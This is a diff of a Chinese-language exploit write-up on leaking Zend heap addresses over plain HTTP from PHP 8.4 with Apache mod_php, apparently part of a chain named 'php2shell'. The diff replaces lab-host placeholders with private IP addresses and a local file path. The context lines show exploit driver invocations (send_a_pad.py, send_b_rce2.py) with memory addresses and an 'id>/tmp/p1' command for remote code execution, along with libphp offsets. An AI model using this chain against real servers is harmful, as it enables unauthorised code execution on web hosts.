@@ -1,7 +1,7 @@
 # 纯 HTTP 堆地址泄漏：stale `PS(id)` + `Set-Cookie` 越界读
 
 日期：2026-10-21
-目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64，`<LAB_HOST>`）
+目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64，`172.16.0.103`）
 约束：**完全远程、只用 HTTP；不在目标 webroot 写任何特定 PHP 文件**。目标页面只有
 `<?php echo "OK\n"; ?>`（无 session 调用；本泄漏不依赖脚本内容）。
 状态：**堆地址（Zend MM 2MB chunk base）泄漏已打通**；libphp/libc **代码指针**泄漏
@@ -173,7 +173,7 @@ B 的 multipart 解析在请求启动时把 chunk 重新分页。校准发现该
   `max_input_vars=1000`（默认）。
 
 ```bash
-# 目标机 <LAB_HOST>，ASLR 开/关均可；以下为校准的 no-ASLR 命令
+# 目标机 172.16.0.103，ASLR 开/关均可；以下为校准的 no-ASLR 命令
 cd ~/php2shell-work
 
 # A：1001 个字段触发 max_input_vars 警告；PHPSESSID 为单字节 \x00；
@@ -244,7 +244,7 @@ libphp + `0x43a870`，不需要 libc）或 libc 指针。
 
 ### 5.1 本轮同时得到的 no-ASLR 重校准
 
-在 `<LAB_HOST>`（不是原报告的 <LAB_HOST>）上，原报告的固定参数不直接适用：
+在 `172.16.0.103`（不是原报告的 172.16.1.112）上，原报告的固定参数不直接适用：
 
 ```text
 A: send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
@@ -292,7 +292,7 @@ B: send_b_rce2.py 16 2 0x7ffff5e6e0d8 0x7ffff7d14490 "id>/tmp/p1"
 > 嵌套数组，把 `$_POST['a0443']` 的 HashTable 扩到 16 个元素。`PS(id)+0x10` 读到
 > `nTableSize=16`，数据区覆盖 `nNextFreeElement` 和 `pDestructor`
 > （`ZVAL_PTR_DTOR = libphp+0x613c50`）。完整链路、payload 和驱动见
-> [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)。以下保留原始分析。
+> [ASLR_PURE_HTTP.md](/Users/my/php2shell/ASLR_PURE_HTTP.md)。以下保留原始分析。
 
 目标：拿到一个 libphp 代码地址（例如 HashTable 的
 `pDestructor = ZVAL_PTR_DTOR`），配合已知 chunk base 使用 g18 的
